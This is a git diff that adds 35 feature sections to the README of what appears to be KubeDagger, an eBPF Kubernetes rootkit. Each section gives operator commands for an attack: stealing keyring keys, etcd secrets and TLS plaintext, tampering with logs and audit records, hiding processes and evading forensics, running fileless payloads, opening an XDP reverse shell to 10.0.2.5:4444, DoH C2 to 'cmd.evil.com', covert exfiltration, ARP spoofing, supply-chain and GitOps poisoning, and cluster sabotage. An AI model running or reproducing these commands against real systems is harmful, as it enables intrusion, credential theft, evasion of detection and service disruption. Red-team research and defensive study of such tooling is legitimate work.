@@ -28,6 +28,41 @@
   - [Admission Webhook Backdoor](#20-admission-webhook-backdoor)
   - [CRI-Level Image Tampering](#21-cri-level-image-tampering)
   - [DaemonSet Dropper](#22-daemonset-dropper)
+  - [Kernel Keyring Theft](#23-kernel-keyring-theft)
+  - [TLS Traffic Interception](#24-tls-traffic-interception)
+  - [Etcd Credential Theft](#25-etcd-credential-theft)
+  - [Log Tampering](#26-log-tampering)
+  - [Syscall-Level Hiding](#27-syscall-level-hiding)
+  - [Audit Log Filtering](#28-audit-log-filtering)
+  - [Pcap Blinding](#29-pcap-blinding)
+  - [Core Dump Suppression](#30-core-dump-suppression)
+  - [Timestamp Manipulation](#31-timestamp-manipulation)
+  - [BPF Polymorphism](#32-bpf-polymorphism)
+  - [Fileless Execution](#33-fileless-execution)
+  - [XDP Reverse Shell](#34-xdp-reverse-shell)
+  - [BPF Map IPC](#35-bpf-map-ipc)
+  - [K8s Event C2](#36-k8s-event-c2)
+  - [Container Log C2](#37-container-log-c2)
+  - [TCP Window Steganography](#38-tcp-window-steganography)
+  - [DNS-over-HTTPS C2](#39-dns-over-https-c2)
+  - [Covert Channels](#40-covert-channels)
+  - [ARP Cache Poisoning](#41-arp-cache-poisoning)
+  - [Kubelet API Abuse](#42-kubelet-api-abuse)
+  - [Veth Pair Hijacking](#43-veth-pair-hijacking)
+  - [Sidecar Container Injection](#44-sidecar-container-injection)
+  - [Supply Chain Injection](#45-supply-chain-injection)
+  - [GitOps Repository Poisoning](#46-gitops-repository-poisoning)
+  - [Service Account Token Minting](#47-service-account-token-minting)
+  - [Pod Identity Theft](#48-pod-identity-theft)
+  - [Image Signature Bypass](#49-image-signature-bypass)
+  - [CRD-Based Backdoor](#50-crd-based-backdoor)
+  - [Honeypot Detection](#51-honeypot-detection)
+  - [Scheduler Starvation](#52-scheduler-starvation)
+  - [Syscall Fault Injection](#53-syscall-fault-injection)
+  - [Cgroup Resource Manipulation](#54-cgroup-resource-manipulation)
+  - [Leader Election Disruption](#55-leader-election-disruption)
+  - [Certificate Rotation Sabotage](#56-certificate-rotation-sabotage)
+  - [Kernel Keyring MITM](#57-kernel-keyring-mitm)
 - [Encrypted C2 Channel](#encrypted-c2-channel)
 - [Persistence](#persistence)
 - [Multi-Node Coordination](#multi-node-coordination)
@@ -387,7 +422,7 @@ kubedagger-client mitre export --format markdown
 | `--format` | `json` | Output format: `json` or `markdown` |
 | `-o, --output` | stdout | Output file path |
 
-**Mapped techniques (25 total):**
+**Mapped techniques (37 total):**
 | Technique | ID | KubeDagger Feature |
 |-----------|----|--------------------|
 | Implant Internal Image | T1525 | docker, webhook, cri-tamper |
@@ -415,6 +450,18 @@ kubedagger-client mitre export --format markdown
 | Transfer Data to Cloud Account | T1537 | cloud exfil |
 | Data Manipulation: Transmitted | T1565.002 | obs-poison |
 | Container Orchestration Job | T1053.007 | daemonset |
+| Network Sniffing | T1040 | tls-intercept |
+| Unsecured Credentials: Private Keys | T1552.004 | etcd-steal |
+| Password Managers | T1555.005 | keyring |
+| Clear Linux/Mac System Logs | T1070.002 | log-tamper |
+| Indicator Blocking | T1562.006 | syscall-bypass |
+| Reflective Code Loading | T1620 | fileless-exec |
+| Protocol Tunneling | T1572 | covert-channel |
+| ARP Cache Poisoning | T1557.002 | arp-spoof |
+| Container Administration Command | T1609 | kubelet |
+| Compromise Software Supply Chain | T1195.002 | supply-chain |
+| Application Access Token | T1550.001 | sa-token |
+| Code Signing Policy Modification | T1553.006 | sig-bypass |
 
 The JSON output is compatible with the [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) for visualization.
 
@@ -773,6 +820,851 @@ kubedagger-client daemonset --action status --name kube-health --namespace kube-
 2. Each pod loads KubeDagger's eBPF programs on its node
 3. Uses legitimate-sounding names to blend with system workloads
 4. Tolerates all taints to ensure deployment on every node (including control plane)
+
+---
+
+### 23. Kernel Keyring Theft
+
+Steal encryption keys, Kerberos tickets, and eCryptfs keys from the Linux kernel keyring subsystem.
+
+```shell
+# List all keys in the keyring
+kubedagger-client keyring --mode list
+
+# Dump all user-type keys
+kubedagger-client keyring --mode dump --key-type user
+
+# Monitor keyring operations in real-time
+kubedagger-client keyring --mode monitor --key-type all
+
+# Save to file
+kubedagger-client keyring --mode dump --key-type logon -o keys.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--mode` | `list` | Operation mode: `list`, `dump`, or `monitor` |
+| `--key-type` | `all` | Key type filter: `all`, `user`, or `logon` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 24. TLS Traffic Interception
+
+Attach uprobes to SSL_read/SSL_write to capture plaintext traffic before/after encryption.
+
+```shell
+# Start intercepting a specific process
+kubedagger-client tls-intercept --action start --target-pid 1234 --lib openssl
+
+# Auto-detect TLS library
+kubedagger-client tls-intercept --action start --target-pid 1234 --lib auto
+
+# Stop interception
+kubedagger-client tls-intercept --action stop --target-pid 1234
+
+# Dump captured data
+kubedagger-client tls-intercept --action dump -o captured.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--action` | (required) | `start`, `stop`, or `dump` |
+| `--target-pid` | (required for start/stop) | PID of the target process |
+| `--lib` | `auto` | TLS library: `openssl`, `gnutls`, or `auto` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 25. Etcd Credential Theft
+
+Intercept etcd gRPC traffic to extract secrets, tokens, and client certificates.
+
+```shell
+# Dump all secrets from etcd
+kubedagger-client etcd-steal --mode dump
+
+# Watch specific key prefix
+kubedagger-client etcd-steal --mode watch --key-prefix /registry/secrets
+
+# Save results
+kubedagger-client etcd-steal --mode dump --key-prefix /registry/secrets/kube-system -o etcd.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--mode` | `dump` | Operation mode: `dump` or `watch` |
+| `--key-prefix` | `/registry/secrets` | Etcd key prefix to target |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 26. Log Tampering
+
+Hook vfs_write and journald to drop, modify, or inject log entries in real-time.
+
+```shell
+# Drop log entries matching a pattern
+kubedagger-client log-tamper --mode drop --pattern "kubedagger" --target syslog
+
+# Modify container logs
+kubedagger-client log-tamper --mode modify --pattern "error" --target container
+
+# Inject fake entries into journal
+kubedagger-client log-tamper --mode inject --pattern "healthy" --target journal
+
+# Save operation report
+kubedagger-client log-tamper --mode drop --pattern "suspicious" --target syslog -o tamper.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--mode` | (required) | `drop`, `modify`, or `inject` |
+| `--pattern` | (required) | Regex pattern for matching/injecting |
+| `--target` | `syslog` | Log target: `syslog`, `journal`, or `container` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 27. Syscall-Level Hiding
+
+Hook getdents64, stat, and /proc reads to hide PIDs, files, and network ports from userspace.
+
+```shell
+# Hide specific PIDs
+kubedagger-client syscall-bypass --hide-pids "1234,5678"
+
+# Hide files and ports
+kubedagger-client syscall-bypass --hide-files "rootkit.so,backdoor" --hide-ports "4444,8080"
+
+# Combined hiding
+kubedagger-client syscall-bypass --hide-pids "1234" --hide-files "evil.bin" --hide-ports "9001" -o hide.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--hide-pids` | | Comma-separated PIDs to hide |
+| `--hide-files` | | Comma-separated filenames to hide |
+| `--hide-ports` | | Comma-separated ports to hide |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 28. Audit Log Filtering
+
+Hook audit_log_start/end to suppress or modify audit records for rootkit operations.
+
+```shell
+# Suppress audit records for specific PIDs
+kubedagger-client audit-filter --mode suppress --filter-pids "1234,5678"
+
+# Modify audit records
+kubedagger-client audit-filter --mode modify --filter-pids "1234"
+
+# Save report
+kubedagger-client audit-filter --mode suppress --filter-pids "1234" -o audit.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--mode` | `suppress` | Filter mode: `suppress` or `modify` |
+| `--filter-pids` | (required) | Comma-separated PIDs to filter |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 29. Pcap Blinding
+
+Attach socket filters to AF_PACKET sockets to hide C2 traffic from tcpdump and Wireshark.
+
+```shell
+# Hide traffic on specific ports
+kubedagger-client pcap-blind --hide-ports "9001,4444"
+
+# Hide traffic from specific IPs
+kubedagger-client pcap-blind --hide-ips "10.0.2.5,192.168.1.100"
+
+# Combined
+kubedagger-client pcap-blind --hide-ports "9001" --hide-ips "10.0.2.5" -o pcap.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--hide-ports` | | Comma-separated ports to hide from captures |
+| `--hide-ips` | | Comma-separated IPs to hide from captures |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 30. Core Dump Suppression
+
+Hook do_coredump to prevent memory dumps of rootkit processes, blocking memory forensics.
+
+```shell
+# Suppress core dumps for specific PIDs
+kubedagger-client coredump-suppress --pids "1234,5678"
+
+# Save report
+kubedagger-client coredump-suppress --pids "1234,5678" -o coredump.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--pids` | (required) | Comma-separated PIDs to protect |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 31. Timestamp Manipulation
+
+Hook clock functions to skew time responses for targeted processes, confusing forensic timelines.
+
+```shell
+# Fixed time offset
+kubedagger-client timeskew --target-pids "1234" --offset "-3600" --mode fixed
+
+# Random jitter
+kubedagger-client timeskew --target-pids "1234,5678" --offset "300" --mode random
+
+# Save report
+kubedagger-client timeskew --target-pids "1234" --offset "-7200" --mode fixed -o skew.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--target-pids` | (required) | Comma-separated PIDs to skew |
+| `--offset` | (required) | Time offset in seconds |
+| `--mode` | `fixed` | Skew mode: `fixed` or `random` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 32. BPF Polymorphism
+
+Mutate BPF bytecode at load time — randomize map names, reorder instructions, insert NOPs to evade signatures.
+
+```shell
+# Reload with random seed
+kubedagger-client polymorph --seed "random"
+
+# Reload with specific seed
+kubedagger-client polymorph --seed "0xdeadbeef"
+
+# Save mutation report
+kubedagger-client polymorph --seed "random" -o morph.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--seed` | `random` | Mutation seed value |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 33. Fileless Execution
+
+Execute payloads via memfd_create + execveat with no disk artifacts.
+
+```shell
+# Execute a base64 payload
+kubedagger-client fileless-exec --payload "$(base64 /tmp/implant)" --name "[kworker/0:1]"
+
+# Save execution report
+kubedagger-client fileless-exec --payload "..." --name "[migration/0]" -o exec.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--payload` | (required) | Base64-encoded binary payload |
+| `--name` | `[kworker/0:0]` | Fake process name for /proc/self/exe |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 34. XDP Reverse Shell
+
+Spawn a reverse shell triggered by crafted XDP magic packets.
+
+```shell
+# Connect back over ICMP
+kubedagger-client xdp-shell --connect "10.0.2.5:4444" --protocol icmp
+
+# UDP-based shell
+kubedagger-client xdp-shell --connect "10.0.2.5:4444" --protocol udp
+
+# Custom TCP
+kubedagger-client xdp-shell --connect "10.0.2.5:4444" --protocol tcp-custom -o shell.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--connect` | (required) | Callback address `ip:port` |
+| `--protocol` | `icmp` | Protocol: `icmp`, `udp`, or `tcp-custom` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 35. BPF Map IPC
+
+Enable inter-program communication via BPF maps for coordinated operations.
+
+```shell
+# Send a message on a channel
+kubedagger-client bpf-ipc --action send --channel "cmd" --message "execute"
+
+# Receive from a channel
+kubedagger-client bpf-ipc --action recv --channel "cmd"
+
+# Save results
+kubedagger-client bpf-ipc --action recv --channel "data" -o ipc.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--action` | (required) | `send` or `recv` |
+| `--channel` | (required) | Channel identifier |
+| `--message` | | Message to send (required for `send`) |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 36. K8s Event C2
+
+Use Kubernetes Event objects as a covert command-and-control channel.
+
+```shell
+# Start event-based C2 beacon
+kubedagger-client k8s-event-c2 --namespace "kube-system" --beacon "30"
+
+# Custom namespace
+kubedagger-client k8s-event-c2 --namespace "default" --beacon "60" -o events.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--namespace` | `default` | Kubernetes namespace for events |
+| `--beacon` | `30` | Beacon interval in seconds |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 37. Container Log C2
+
+Hide C2 data steganographically in container stdout/stderr logs.
+
+```shell
+# Base85 encoding in container logs
+kubedagger-client container-log-c2 --container "webapp" --encode base85
+
+# Whitespace steganography
+kubedagger-client container-log-c2 --container "api-server" --encode whitespace
+
+# Unicode encoding
+kubedagger-client container-log-c2 --container "proxy" --encode unicode -o logc2.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--container` | (required) | Target container name |
+| `--encode` | `base85` | Encoding: `base85`, `whitespace`, or `unicode` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 38. TCP Window Steganography
+
+Encode covert data in TCP window size field via TC egress BPF — invisible to DPI.
+
+```shell
+# Send data with 2 bits per packet
+kubedagger-client tcp-stego --data "secret payload" --dest "10.0.2.5:443" --bits-per-packet 2
+
+# Higher throughput (4 bits)
+kubedagger-client tcp-stego --data "more data" --dest "10.0.2.5:443" --bits-per-packet 4 -o stego.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--data` | (required) | Data to transmit covertly |
+| `--dest` | (required) | Destination `ip:port` |
+| `--bits-per-packet` | `2` | Bits encoded per packet: `2` or `4` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 39. DNS-over-HTTPS C2
+
+Route C2 traffic through DoH providers to bypass DNS monitoring.
+
+```shell
+# Use Cloudflare DoH
+kubedagger-client doh-c2 --resolver cloudflare --domain "c2.example.com"
+
+# Use Google DoH
+kubedagger-client doh-c2 --resolver google --domain "data.attacker.com"
+
+# Custom resolver
+kubedagger-client doh-c2 --resolver "https://custom.resolver/dns-query" --domain "cmd.evil.com" -o doh.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--resolver` | `cloudflare` | DoH resolver: `cloudflare`, `google`, or custom URL |
+| `--domain` | (required) | C2 domain for TXT record queries |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 40. Covert Channels
+
+Use ICMP payload, IPv4 ID field, TCP urgent pointer, or IP TTL encoding for stealth communication.
+
+```shell
+# ICMP payload channel
+kubedagger-client covert-channel --type icmp --dest "10.0.2.5" --data "command"
+
+# IPv4 ID field encoding
+kubedagger-client covert-channel --type ipid --dest "10.0.2.5" --data "exfil"
+
+# TCP urgent pointer
+kubedagger-client covert-channel --type urgent --dest "10.0.2.5:443" --data "payload"
+
+# TTL encoding
+kubedagger-client covert-channel --type ttl --dest "10.0.2.5" --data "secret" -o covert.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--type` | (required) | Channel type: `icmp`, `ipid`, `urgent`, or `ttl` |
+| `--dest` | (required) | Destination IP (or `ip:port` for `urgent`) |
+| `--data` | (required) | Data payload to transmit |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 41. ARP Cache Poisoning
+
+Inject gratuitous ARP replies via XDP to MITM pod-to-pod traffic in the cluster network.
+
+```shell
+# Poison ARP cache to intercept traffic
+kubedagger-client arp-spoof --victim-ip "10.244.1.5" --gateway-ip "10.244.1.1" --interface eth0
+
+# Save report
+kubedagger-client arp-spoof --victim-ip "10.244.1.5" --gateway-ip "10.244.1.1" --interface cni0 -o arp.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--victim-ip` | (required) | IP of the pod to intercept |
+| `--gateway-ip` | (required) | IP of the gateway to impersonate |
+| `--interface` | (required) | Network interface for ARP injection |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 42. Kubelet API Abuse
+
+Connect to kubelet API (10250) using stolen node credentials to exec in pods and dump secrets.
+
+```shell
+# List pods on a node
+kubedagger-client kubelet --action list --node "10.0.2.3"
+
+# Execute command in a pod
+kubedagger-client kubelet --action exec --node "10.0.2.3" --pod "webapp-abc123" --cmd "cat /etc/shadow"
+
+# Dump secrets from a pod
+kubedagger-client kubelet --action secrets --node "10.0.2.3" --pod "vault-0" -o secrets.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--action` | (required) | `list`, `exec`, or `secrets` |
+| `--node` | (required) | Kubelet node IP |
+| `--pod` | | Target pod name (required for `exec`/`secrets`) |
+| `--cmd` | | Command to execute (required for `exec`) |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 43. Veth Pair Hijacking
+
+Attach TC BPF to veth pairs for transparent pod-to-pod traffic interception.
+
+```shell
+# Mirror traffic between pods
+kubedagger-client veth-hijack --source-pod "frontend" --dest-pod "backend" --mode mirror
+
+# Redirect traffic
+kubedagger-client veth-hijack --source-pod "frontend" --dest-pod "attacker" --mode redirect
+
+# Inject packets
+kubedagger-client veth-hijack --source-pod "frontend" --dest-pod "backend" --mode inject -o veth.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--source-pod` | (required) | Source pod name |
+| `--dest-pod` | (required) | Destination pod name |
+| `--mode` | `mirror` | Mode: `mirror`, `redirect`, or `inject` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 44. Sidecar Container Injection
+
+Use kubelet CRI API to inject containers directly into running pods, bypassing admission control.
+
+```shell
+# Inject a sidecar
+kubedagger-client sidecar-inject --pod "webapp-abc123" --image "alpine:latest" --namespace "default"
+
+# Inject into kube-system
+kubedagger-client sidecar-inject --pod "coredns-xyz" --image "busybox" --namespace "kube-system" -o inject.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--pod` | (required) | Target pod name |
+| `--image` | (required) | Container image to inject |
+| `--namespace` | `default` | Pod namespace |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 45. Supply Chain Injection
+
+Perform OCI manifest manipulation and layer injection for container image supply chain attacks.
+
+```shell
+# Inject a malicious layer
+kubedagger-client supply-chain --mode layer-inject --target-image "nginx:latest" --payload "/tmp/backdoor.tar"
+
+# Replace entire manifest
+kubedagger-client supply-chain --mode manifest-replace --target-image "webapp:v1" --payload "/tmp/evil-manifest.json"
+
+# Save report
+kubedagger-client supply-chain --mode layer-inject --target-image "api:v2" --payload "/tmp/implant.tar" -o supply.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--mode` | (required) | Attack mode: `layer-inject` or `manifest-replace` |
+| `--target-image` | (required) | Target container image |
+| `--payload` | (required) | Path to malicious payload/manifest |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 46. GitOps Repository Poisoning
+
+Target ArgoCD/Flux sync mechanisms to inject malicious manifests into GitOps repositories.
+
+```shell
+# Poison a manifest in a GitOps repo
+kubedagger-client gitops-poison --repo "https://github.com/org/infra" --target-path "deployments/webapp.yaml" --inject-image "evil/webapp:latest"
+
+# Save report
+kubedagger-client gitops-poison --repo "https://github.com/org/infra" --target-path "apps/api.yaml" --inject-image "backdoor/api:v1" -o gitops.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--repo` | (required) | GitOps repository URL |
+| `--target-path` | (required) | Path to manifest to modify |
+| `--inject-image` | (required) | Malicious image to inject |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 47. Service Account Token Minting
+
+Mint or steal Kubernetes service account tokens with elevated permissions.
+
+```shell
+# Mint a new token
+kubedagger-client sa-token --action mint --service-account "admin" --namespace "kube-system" --audience "https://kubernetes.default.svc"
+
+# Steal existing token
+kubedagger-client sa-token --action steal --service-account "default" --namespace "default"
+
+# Save results
+kubedagger-client sa-token --action mint --service-account "cluster-admin" --namespace "kube-system" -o token.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--action` | (required) | `mint` or `steal` |
+| `--service-account` | (required) | Service account name |
+| `--namespace` | `default` | Service account namespace |
+| `--audience` | | Token audience (for `mint`) |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 48. Pod Identity Theft
+
+Steal projected SA tokens and spoof source IP to impersonate other pods.
+
+```shell
+# Steal pod identity
+kubedagger-client pod-identity --target-pod "vault-0" --namespace "vault" --action steal
+
+# Impersonate a pod
+kubedagger-client pod-identity --target-pod "api-server-abc" --namespace "default" --action impersonate
+
+# Save results
+kubedagger-client pod-identity --target-pod "payment-svc" --namespace "prod" --action steal -o identity.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--target-pod` | (required) | Pod to impersonate |
+| `--namespace` | `default` | Pod namespace |
+| `--action` | (required) | `steal` or `impersonate` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 49. Image Signature Bypass
+
+Bypass Sigstore/Cosign verification by injecting signatures or disabling admission validation.
+
+```shell
+# Inject a trusted signature
+kubedagger-client sig-bypass --mode inject-sig --target-image "webapp:latest"
+
+# Disable verification
+kubedagger-client sig-bypass --mode disable-verify --target-image "api:v1"
+
+# Save report
+kubedagger-client sig-bypass --mode inject-sig --target-image "nginx:latest" -o sigbypass.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--mode` | (required) | Bypass mode: `inject-sig` or `disable-verify` |
+| `--target-image` | (required) | Target image to bypass verification for |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 50. CRD-Based Backdoor
+
+Deploy a legitimate-looking CRD with a controller that executes rootkit commands on reconcile.
+
+```shell
+# Deploy CRD backdoor
+kubedagger-client crd-backdoor --action deploy --crd-name "healthchecks.monitoring.k8s.io"
+
+# Trigger execution
+kubedagger-client crd-backdoor --action trigger --crd-name "healthchecks.monitoring.k8s.io"
+
+# Remove backdoor
+kubedagger-client crd-backdoor --action remove --crd-name "healthchecks.monitoring.k8s.io" -o crd.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--action` | (required) | `deploy`, `trigger`, or `remove` |
+| `--crd-name` | (required) | CRD resource name |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 51. Honeypot Detection
+
+Fingerprint environment inconsistencies to detect honeypot or deception clusters.
+
+```shell
+# Run all detection checks
+kubedagger-client honeypot-detect --checks all
+
+# Specific checks only
+kubedagger-client honeypot-detect --checks "kubelet,metrics,tokens"
+
+# Save detection report
+kubedagger-client honeypot-detect --checks all -o honeypot.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--checks` | `all` | Checks to run: `all`, `kubelet`, `metrics`, `tokens` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 52. Scheduler Starvation
+
+Use eBPF kprobes on CFS scheduler to starve target pods of CPU time.
+
+```shell
+# Low intensity starvation
+kubedagger-client sched-starve --target-cgroup "/kubepods/pod-abc123" --intensity low
+
+# High intensity
+kubedagger-client sched-starve --target-cgroup "/kubepods/burstable/pod-xyz" --intensity high
+
+# Save report
+kubedagger-client sched-starve --target-cgroup "/kubepods/pod-abc123" --intensity medium -o sched.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--target-cgroup` | (required) | Target pod's cgroup path |
+| `--intensity` | `medium` | Starvation intensity: `low`, `medium`, or `high` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 53. Syscall Fault Injection
+
+Use kretprobes to randomly return error codes from syscalls for target processes.
+
+```shell
+# Inject faults on read/write
+kubedagger-client fault-inject --target-pids "1234" --syscalls "read,write" --error-rate 10 --errno 5
+
+# Network faults
+kubedagger-client fault-inject --target-pids "1234,5678" --syscalls "connect,accept" --error-rate 50 --errno 111
+
+# Save report
+kubedagger-client fault-inject --target-pids "1234" --syscalls "open,read" --error-rate 25 --errno 2 -o fault.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--target-pids` | (required) | Comma-separated target PIDs |
+| `--syscalls` | (required) | Comma-separated syscalls to fault |
+| `--error-rate` | `10` | Fault injection rate as percentage |
+| `--errno` | `5` | Error code to return (e.g., 5=EIO, 2=ENOENT) |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 54. Cgroup Resource Manipulation
+
+Modify cgroup resource limits to cause OOM kills, CPU throttling, or freezing for target pods.
+
+```shell
+# Limit memory to trigger OOM
+kubedagger-client cgroup-manip --target-pod "webapp" --resource memory --action limit
+
+# Freeze a pod's cgroup
+kubedagger-client cgroup-manip --target-pod "api-server" --resource cpu --action freeze
+
+# Force OOM kill
+kubedagger-client cgroup-manip --target-pod "database" --resource memory --action kill -o cgroup.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--target-pod` | (required) | Target pod name |
+| `--resource` | (required) | Resource: `memory` or `cpu` |
+| `--action` | (required) | Action: `limit`, `freeze`, or `kill` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 55. Leader Election Disruption
+
+Manipulate Kubernetes Lease objects to disrupt controller leader election.
+
+```shell
+# Steal leadership
+kubedagger-client election-disrupt --target scheduler --mode steal
+
+# Deny election
+kubedagger-client election-disrupt --target controller-manager --mode deny
+
+# Oscillate leadership
+kubedagger-client election-disrupt --target "custom-controller" --mode oscillate -o election.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--target` | (required) | Target: `scheduler`, `controller-manager`, or custom name |
+| `--mode` | (required) | Disruption mode: `steal`, `deny`, or `oscillate` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 56. Certificate Rotation Sabotage
+
+Intercept certificate rotation to inject attacker-controlled certs or force expiry.
+
+```shell
+# Inject attacker certificate
+kubedagger-client cert-sabotage --mode inject --target kubelet
+
+# Block certificate renewal
+kubedagger-client cert-sabotage --mode block --target apiserver
+
+# Force certificate expiry
+kubedagger-client cert-sabotage --mode expire --target etcd -o cert.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--mode` | (required) | Sabotage mode: `inject`, `block`, or `expire` |
+| `--target` | (required) | Target component: `kubelet`, `apiserver`, or `etcd` |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 57. Kernel Keyring MITM
+
+Intercept key_create_or_update to replace key material with attacker-controlled values.
+
+```shell
+# MITM user-type keys
+kubedagger-client keyring-mitm --target-key-type user --replace-with "/tmp/attacker-key"
+
+# MITM logon keys
+kubedagger-client keyring-mitm --target-key-type logon --replace-with "/tmp/evil-key" -o mitm.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--target-key-type` | (required) | Key type to intercept: `user`, `logon`, etc. |
+| `--replace-with` | (required) | Path to attacker key material |
+| `-o, --output` | stdout | Output file |
 
 ---
 
